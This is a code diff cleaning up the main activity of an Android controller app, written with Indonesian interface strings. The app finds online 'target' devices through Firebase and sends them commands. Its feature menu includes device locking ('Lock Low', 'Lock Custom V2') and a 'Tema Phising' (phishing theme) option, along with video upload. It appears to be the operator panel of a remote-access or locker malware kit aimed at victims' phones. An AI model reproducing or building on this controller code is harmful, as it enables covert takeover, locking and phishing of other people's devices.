@@ -1,25 +1,15 @@
 package com.paragon.control;
 
-import android.animation.Animator;
-import android.animation.AnimatorListenerAdapter;
 import android.app.AlertDialog;
 import android.content.Intent;
 import android.net.Uri;
-import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
-import android.provider.Settings;
-import android.text.InputType;
-import android.view.Gravity;
 import android.view.View;
-import android.view.animation.Animation;
-import android.view.animation.AnimationUtils;
 import android.widget.Button;
-import android.widget.EditText;
 import android.widget.FrameLayout;
 import android.widget.GridLayout;
 import android.widget.LinearLayout;
-import android.widget.ScrollView;
 import android.widget.Switch;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -34,8 +24,6 @@ import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.database.ValueEventListener;
 import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.StorageReference;
-import java.util.HashMap;
-import java.util.Map;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -50,11 +38,8 @@ public class MainActivity extends AppCompatActivity {
 
     private String selectedTargetId = null;
     private boolean isTargetConnected = false;
-    private boolean hasCheckedTarget = false;
 
     private static final int REQUEST_VIDEO = 1001;
-
-    private ValueEventListener targetListListener;
     private Handler handler = new Handler();
 
     @Override
@@ -75,26 +60,14 @@ public class MainActivity extends AppCompatActivity {
         mDatabase = database.getReference("target");
         mStorage = FirebaseStorage.getInstance().getReference();
 
-        // ===== TOMBOL PILIH TARGET =====
-        btnPilihTarget.setOnClickListener(v -> {
-            checkTargetsAndProceed();
-        });
+        btnPilihTarget.setOnClickListener(v -> checkTargetsAndProceed());
+        btnRefresh.setOnClickListener(v -> checkTargetsAndProceed());
 
-        // ===== TOMBOL REFRESH =====
-        btnRefresh.setOnClickListener(v -> {
-            checkTargetsAndProceed();
-        });
-
-        // ===== CEK TARGET SAAT APLIKASI DIBUKA =====
         checkTargetsAndProceed();
-
-        // ===== SETUP GRID =====
         setupGrid();
     }
 
-    // ===== CEK TARGET =====
     private void checkTargetsAndProceed() {
-        // Tampilkan loading di dialog
         btnPilihTarget.setText("⏳ Mencari...");
         btnPilihTarget.setEnabled(false);
         btnRefresh.setEnabled(false);
@@ -113,18 +86,14 @@ public class MainActivity extends AppCompatActivity {
                     String key = child.getKey();
                     if (key == null || key.equals("serverUrl")) continue;
                     Boolean online = child.child("online").getValue(Boolean.class);
-                    if (online != null && online) {
-                        hasOnlineTarget = true;
-                    }
+                    if (online != null && online) hasOnlineTarget = true;
                     hasTarget = true;
                     break;
                 }
 
                 if (hasTarget && hasOnlineTarget) {
-                    // ADA TARGET ONLINE → tampilkan daftar target
                     showTargetList();
                 } else {
-                    // BELUM ADA TARGET → tampilkan dialog
                     showDialogNoTarget();
                 }
             }
@@ -139,20 +108,17 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
-    // ===== TAMPILKAN DIALOG BELUM ADA TARGET =====
     private void showDialogNoTarget() {
         dialogOverlay.setVisibility(View.VISIBLE);
         targetListLayout.setVisibility(View.GONE);
         controlLayout.setVisibility(View.GONE);
     }
 
-    // ===== TAMPILKAN DAFTAR TARGET =====
     private void showTargetList() {
         dialogOverlay.setVisibility(View.GONE);
         targetListLayout.setVisibility(View.VISIBLE);
         controlLayout.setVisibility(View.GONE);
 
-        // Ambil daftar target dari Firebase
         mDatabase.addValueEventListener(new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
@@ -172,7 +138,6 @@ public class MainActivity extends AppCompatActivity {
                     if (deviceName == null || deviceId == null) continue;
                     hasTarget = true;
 
-                    // Inflate item target
                     View item = getLayoutInflater().inflate(R.layout.item_target, null);
 
                     TextView tvName = item.findViewById(R.id.tvTargetName);
@@ -213,14 +178,12 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
-    // ===== TAMPILKAN HALAMAN CONTROL DEVICE =====
     private void showControlDevice() {
         dialogOverlay.setVisibility(View.GONE);
         targetListLayout.setVisibility(View.GONE);
         controlLayout.setVisibility(View.VISIBLE);
     }
 
-    // ===== SETUP GRID FITUR =====
     private void setupGrid() {
         String[] fiturNames = {
             "Flashlight", "Lock Low", "Lock Custom V2", "Tema Phising",
@@ -249,7 +212,6 @@ public class MainActivity extends AppCompatActivity {
                 btnAction.setVisibility(View.GONE);
                 status.setVisibility(View.VISIBLE);
 
-                // Set status awal
                 status.setText("OFF");
                 status.setTextColor(0xFFE56A8D);
 
@@ -261,7 +223,6 @@ public class MainActivity extends AppCompatActivity {
                     }
                     status.setText(isChecked ? "ON" : "OFF");
                     status.setTextColor(isChecked ? 0xFF30D158 : 0xFFE56A8D);
-                    // Kirim perintah ke Firebase
                     mDatabase.child(selectedTargetId).child(fiturNames[index].toLowerCase()).setValue(isChecked);
                     showSnackbar("Perintah berhasil dikirim");
                 });
@@ -281,7 +242,6 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    // ===== DIALOG KONFIRMASI =====
     private void showConfirmDialog(String fiturName) {
         AlertDialog.Builder builder = new AlertDialog.Builder(this);
         builder.setTitle("Konfirmasi");
@@ -297,7 +257,6 @@ public class MainActivity extends AppCompatActivity {
         builder.show();
     }
 
-    // ===== CEK KONEKSI TARGET =====
     private boolean checkTargetConnection() {
         if (selectedTargetId == null || !isTargetConnected) {
             showSnackbar("⚠️ Silakan pilih target terlebih dahulu");
@@ -306,7 +265,6 @@ public class MainActivity extends AppCompatActivity {
         return true;
     }
 
-    // ===== SNACKBAR =====
     private void showSnackbar(String message) {
         Snackbar.make(findViewById(android.R.id.content), message, Snackbar.LENGTH_SHORT).show();
     }
@@ -332,4 +290,4 @@ public class MainActivity extends AppCompatActivity {
             showSnackbar("❌ Gagal upload video");
         });
     }
-                    }
+                                       }
